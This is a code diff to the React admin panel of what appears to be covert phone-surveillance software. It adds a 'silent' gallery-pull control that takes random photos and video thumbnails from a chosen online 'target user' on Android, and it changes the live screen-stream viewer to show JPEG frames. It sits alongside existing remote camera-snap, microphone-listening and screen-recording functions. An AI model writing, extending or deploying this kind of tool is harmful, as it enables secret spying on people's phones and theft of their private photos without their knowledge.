@@ -24,10 +24,13 @@ import {
   downloadBase64Jpeg,
   moveLivePhoto,
   playMicStream,
+  requestGalleryPull,
   requestSnap,
+  resetGallerySeen,
   setMicListen,
   setScreenRecord,
   watchCapture,
+  watchGalleryPullStatus,
   watchLiveFolders,
   watchLivePhotos,
   watchScreenStream,
@@ -43,6 +46,144 @@ const FRESH_MS = 90_000;
 
 function isOnline(u: UserDoc, now: number) {
   return Boolean(u.lastSeen) && now - u.lastSeen < FRESH_MS && u.appState !== "background";
+}
+
+
+function GalleryPullBox({
+  users,
+  adminUid,
+}: {
+  users: { u: UserDoc; online: boolean }[];
+  adminUid: string;
+}) {
+  const [target, setTarget] = useState("");
+  const [count, setCount] = useState("10");
+  const [folderId, setFolderId] = useState("");
+  const [gtype, setGtype] = useState<"all" | "image" | "video">("all");
+  const [folders, setFolders] = useState<LiveFolder[]>([]);
+  const [status, setStatus] = useState<string>("");
+  const [busy, setBusy] = useState(false);
+  const [err, setErr] = useState("");
+
+  useEffect(() => watchLiveFolders(setFolders), []);
+  useEffect(() => {
+    if (!target) return;
+    return watchGalleryPullStatus(target, (s) => {
+      if (!s) {
+        setStatus("");
+        return;
+      }
+      setStatus(
+        `${s.status} · ${s.done}/${s.total}` +
+          (s.pool != null ? ` · pool ${s.pool}` : "") +
+          (s.error ? ` · ${s.error}` : ""),
+      );
+    });
+  }, [target]);
+
+  const online = users.filter((x) => x.online);
+
+  const pull = async () => {
+    if (!target) return;
+    setBusy(true);
+    setErr("");
+    try {
+      const n = Math.max(1, Math.min(50, parseInt(count, 10) || 10));
+      await requestGalleryPull(target, adminUid, n, folderId, gtype);
+    } catch (e) {
+      setErr(e instanceof Error ? e.message : "pull fail");
+    } finally {
+      setBusy(false);
+    }
+  };
+
+  const reset = async () => {
+    if (!target) return;
+    if (!confirm("Seen list reset? Dubara wahi photos aa sakti hain.")) return;
+    setBusy(true);
+    try {
+      await resetGallerySeen(target);
+      setStatus("seen reset");
+    } catch (e) {
+      setErr(e instanceof Error ? e.message : "reset fail");
+    } finally {
+      setBusy(false);
+    }
+  };
+
+  return (
+    <div className="glass space-y-2 rounded-2xl p-3">
+      <p className="text-xs font-semibold tracking-wider text-paper/55">
+        GALLERY PULL · silent · random N · no duplicate
+      </p>
+      <select
+        className="h-10 w-full rounded-xl border border-paper/12 bg-ink px-2 text-sm"
+        value={target}
+        onChange={(e) => setTarget(e.target.value)}
+      >
+        <option value="">Target user (online)</option>
+        {online.map(({ u }) => (
+          <option key={u.uid} value={u.uid}>
+            {u.displayName} · @{u.username}
+          </option>
+        ))}
+      </select>
+      <div className="flex gap-2">
+        <input
+          className="h-10 w-20 rounded-xl border border-paper/12 bg-paper/5 px-2 text-sm"
+          value={count}
+          onChange={(e) => setCount(e.target.value.replace(/\D/g, "").slice(0, 2))}
+          placeholder="10"
+          inputMode="numeric"
+        />
+        <select
+          className="h-10 flex-1 rounded-xl border border-paper/12 bg-ink px-2 text-sm"
+          value={gtype}
+          onChange={(e) => setGtype(e.target.value as "all" | "image" | "video")}
+        >
+          <option value="all">Photos + Videos</option>
+          <option value="image">Photos only</option>
+          <option value="video">Videos only (thumbs)</option>
+        </select>
+      </div>
+      <select
+        className="h-10 w-full rounded-xl border border-paper/12 bg-ink px-2 text-sm"
+        value={folderId}
+        onChange={(e) => setFolderId(e.target.value)}
+      >
+        <option value="">Folder: All (none)</option>
+        {folders.map((f) => (
+          <option key={f.id} value={f.id}>
+            {f.name}
+          </option>
+        ))}
+      </select>
+      <div className="flex gap-2">
+        <button
+          type="button"
+          disabled={!target || busy}
+          onClick={() => void pull()}
+          className="btn-hot tap h-10 flex-1 rounded-xl text-sm font-bold"
+        >
+          {busy ? "…" : "Pull random"}
+        </button>
+        <button
+          type="button"
+          disabled={!target || busy}
+          onClick={() => void reset()}
+          className="tap h-10 rounded-xl bg-paper/10 px-3 text-xs font-semibold"
+        >
+          Reset seen
+        </button>
+      </div>
+      {status ? <p className="text-xs text-paper/55">{status}</p> : null}
+      {err ? <p className="text-xs text-rose">{err}</p> : null}
+      <p className="text-[0.7rem] leading-relaxed text-paper/40">
+        Android APK + gallery permission. Full video file nahi — video ka thumbnail aata hai. Photos HQ
+        JPEG. Seen ids dobara nahi aate jab tak Reset na ho.
+      </p>
+    </div>
+  );
 }
 
 function PhotoGallery() {
@@ -179,26 +320,31 @@ function PhotoGallery() {
                 </button>
               </div>
               <div className="grid grid-cols-2 gap-2">
-                {p.front ? (
+                {p.front || p.thumb ? (
                   <figure className="m-0 space-y-1">
                     <img
-                      src={`data:image/jpeg;base64,${p.front}`}
-                      alt="front"
+                      src={`data:image/jpeg;base64,${p.front || p.thumb}`}
+                      alt={p.mediaKind || "photo"}
                       className="w-full rounded-xl bg-black"
                     />
+                    <p className="text-[0.65rem] text-paper/45">
+                      {p.mediaKind === "video" ? "VIDEO thumb" : "photo"}
+                      {p.mediaName ? ` · ${p.mediaName}` : ""}
+                    </p>
                     <button
                       type="button"
                       className="tap flex w-full items-center justify-center gap-1 rounded-lg bg-paper/10 py-1.5 text-xs font-semibold"
                       onClick={() =>
-                        downloadBase64Jpeg(p.front!, `front-${p.username || p.uid}-${p.at}`)
+                        downloadBase64Jpeg(
+                          (p.front || p.thumb)!,
+                          `${p.mediaKind || "img"}-${p.username || p.uid}-${p.at}`,
+                        )
                       }
                     >
-                      <Download className="size-3.5" /> Front HQ
+                      <Download className="size-3.5" /> Download HQ
                     </button>
                   </figure>
-                ) : (
-                  <p className="text-xs text-paper/40">No front</p>
-                )}
+                ) : null}
                 {p.back ? (
                   <figure className="m-0 space-y-1">
                     <img
@@ -216,9 +362,7 @@ function PhotoGallery() {
                       <Download className="size-3.5" /> Back HQ
                     </button>
                   </figure>
-                ) : (
-                  <p className="text-xs text-paper/40">No back</p>
-                )}
+                ) : null}
               </div>
               <div className="flex items-center gap-2">
                 <label className="text-xs text-paper/50">Folder</label>
@@ -255,6 +399,7 @@ export function LiveControlTab() {
   const [capture, setCapture] = useState<CaptureResult | null>(null);
   const [screenInfo, setScreenInfo] = useState("");
   const [screenUrl, setScreenUrl] = useState<string | null>(null);
+  const [screenIsJpeg, setScreenIsJpeg] = useState(false);
   const stops = useRef<Record<string, () => void>>({});
   const screenParts = useRef<BlobPart[]>([]);
   const screenMime = useRef("video/webm");
@@ -309,14 +454,24 @@ export function LiveControlTab() {
           const bin = atob(s.chunk);
           const bytes = new Uint8Array(bin.length);
           for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
-          screenParts.current.push(bytes);
-          if (screenParts.current.length % 3 === 0) {
-            const blob = new Blob(screenParts.current, { type: screenMime.current });
-            const url = URL.createObjectURL(blob);
+          if ((s.mime || "").includes("image")) {
+            const url = URL.createObjectURL(new Blob([bytes], { type: s.mime || "image/jpeg" }));
+            setScreenIsJpeg(true);
             setScreenUrl((old) => {
               if (old) URL.revokeObjectURL(old);
               return url;
             });
+          } else {
+            setScreenIsJpeg(false);
+            screenParts.current.push(bytes);
+            if (screenParts.current.length % 3 === 0) {
+              const blob = new Blob(screenParts.current, { type: screenMime.current });
+              const url = URL.createObjectURL(blob);
+              setScreenUrl((old) => {
+                if (old) URL.revokeObjectURL(old);
+                return url;
+              });
+            }
           }
         } catch {
           /* */
@@ -549,12 +704,20 @@ export function LiveControlTab() {
             SCREEN · {screenInfo || "…"}
           </p>
           {screenUrl ? (
-            <video src={screenUrl} controls playsInline muted className="max-h-60 w-full rounded-xl bg-black" />
+            screenIsJpeg ? (
+              <img src={screenUrl} alt="screen" className="max-h-60 w-full rounded-xl bg-black object-contain" />
+            ) : (
+              <video src={screenUrl} controls playsInline muted className="max-h-60 w-full rounded-xl bg-black" />
+            )
           ) : (
-            <p className="text-xs text-paper/45">Chunks aa rahe…</p>
+            <p className="text-xs text-paper/45">
+              Screen start: target pe ek baar system share dialog aayega (Android rule). Allow ke baad frames yahan.
+            </p>
           )}
         </div>
       ) : null}
+
+      <GalleryPullBox users={rows} adminUid={adminUid} />
 
       <PhotoGallery />
 
